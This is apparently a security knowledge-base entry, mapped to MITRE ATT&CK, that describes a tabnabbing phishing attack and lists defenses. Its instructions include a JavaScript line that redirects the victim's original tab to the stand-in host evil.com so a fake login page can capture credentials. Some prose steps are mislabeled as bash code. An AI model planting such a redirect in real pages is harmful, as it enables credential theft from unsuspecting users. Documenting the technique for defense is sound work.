---
id: c0b8031f-bde1-4a7d-8aca-e652c6caf468
name: Phishing Redirect Attack Procedure
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:40.543394+00:00'
updated_at: '2023-04-06T03:56:40.569417+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Phishing|T1566 - Phishing]]'
tags:
- '[[How to exploit]]'
- '[[Tabnabbing]]'
commands:
- '[[Capture victim''s credentials]]'
- '[[Create malicious website]]'
- '[[Execute JS code]]'
- '[[Phishing page appears]]'
- '[[Trick victim into visiting the site]]'
---

# Phishing Redirect Attack Procedure

## Summary

The Phishing Redirect Attack Procedure is a social engineering technique that exploits the trust of users in the websites they use. The attacker sends a phishing email containing a link to a legitimate website. When the user clicks on the link, they are redirected to a fake website that looks ident

## Description

# Description

The Phishing Redirect Attack Procedure is a social engineering technique that exploits the trust of users in the websites they use. The attacker sends a phishing email containing a link to a legitimate website. When the user clicks on the link, they are redirected to a fake website that looks identical to the original one. The fake website is designed to steal the user's login credentials, credit card information, or any other sensitive data. This procedure can be used to gain initial access to a system or network.

From a technical perspective, the attacker creates a fake website that looks identical to the original one. The attacker then uses the Tabnabbing technique to change the URL of the original website to the fake one. The user is then redirected to the fake website, where they unwittingly enter their sensitive information.

The business value of this procedure is that it can be used to gain access to sensitive information that can be used for financial gain or to gain a foothold in a target network.

 

## Requirements

1. Access to the target's email or a way to send a phishing email.

1. Ability to create a fake website that looks identical to the original one.

 

## Defense

1. Educate users on how to identify phishing emails and fake websites.

1. Use multi-factor authentication to protect against stolen login credentials.

1. Monitor network traffic for suspicious activity.

 

## Objectives

1. To gain access to sensitive information such as login credentials or credit card information.

1. To gain initial access to a system or network.

 

# Instructions

1. To perform this attack, the attacker needs to post a link to a website under his control that contains the JS code 'window.opener.location = "http://evil.com"'. The attacker then tricks the victim into visiting the link, which opens in a new tab. The JS code is executed, and the background tab is redirected to the website 'evil.com', which is most likely a phishing website. If the victim opens the background tab again without looking at the address bar, they may think they are logged out because a login page appears. The victim tries to log in again, and the attacker receives the credentials.

 



**Code**: [[1. Attacker posts a link to a website under his co]]



> This attack is a type of phishing attack where the attacker tricks the victim into visiting a website that looks legitimate but is actually under the attacker's control. The attacker then redirects the victim to a phishing website where they can steal the victim's credentials. This attack can be prevented by being cautious when clicking on links and always checking the address bar to ensure that the website is legitimate.



**Command** ([[Create malicious website]]):

```bash
window.opener.location = "http://evil.com"
```





**Command** ([[Trick victim into visiting the site]]):

```bash
Victim clicks on the link and the site opens in a new tab
```





**Command** ([[Execute JS code]]):

```bash
JS code is executed and the background tab is redirected to the website evil.com
```





**Command** ([[Phishing page appears]]):

```bash
Victim may think they are logged out and try to log in again
```





**Command** ([[Capture victim's credentials]]):

```bash
Attacker receives the credentials
```



## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Phishing|T1566 - Phishing]]

## Commands Used

- [[Capture victim's credentials]]
- [[Create malicious website]]
- [[Execute JS code]]
- [[Phishing page appears]]
- [[Trick victim into visiting the site]]

## Tags

- [[How to exploit]]
- [[Tabnabbing]]


